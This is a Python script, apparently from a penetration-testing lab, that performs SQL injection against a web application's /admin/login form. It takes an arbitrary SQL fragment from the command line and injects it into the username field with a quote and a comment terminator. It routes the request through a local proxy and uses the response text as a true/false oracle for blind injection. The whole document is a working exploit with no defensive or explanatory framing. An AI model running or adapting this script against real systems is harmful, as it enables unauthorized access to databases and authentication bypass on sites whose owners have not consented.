import requests
import argparse
import urllib.parse
import requests, re

parser = argparse.ArgumentParser()
parser = argparse.ArgumentParser()

parser.add_argument("-u", "--url",
                    dest="url",
                    action='store', required=True)
parser.add_argument("-s", "--sql",
                    dest="sql",
                    action='store', required=True)

args = parser.parse_args()
url = args.url
sql = args.sql

login_url = f"{url}/admin/login"

headers = { "Content-Type": "application/x-www-form-urlencoded",
			"Origin": f"{url}",
			"Referer": f"{url}/admin/index.php"}

data = { 'username': f'\' {sql}#', 'password': 'asd', 'login': ''}

#data = f'username=\' {sql}#&password=asd&login='
encoded_data = urllib.parse.urlencode(data)
proxy = { 'http': 'http://127.0.0.1:8080' }
s = requests.Session()
s.get(login_url)
#r = s.post(login_url,data=encoded_data, proxies=proxy, headers=headers,allow_redirects=False)
#print(len(r.text))
r = s.post(login_url,data=encoded_data, proxies=proxy, headers=headers)

if ("Cannot find" in r.text):
	print("Doesnt work")

if ("Incorrect" in r.text):
	print("Works")


"""
Content-Type: application/x-www-form-urlencoded
Content-Length: 44
Origin: http://192.168.224.141:81
Connection: close
Referer: http://192.168.224.141:81/admin/index.php
"""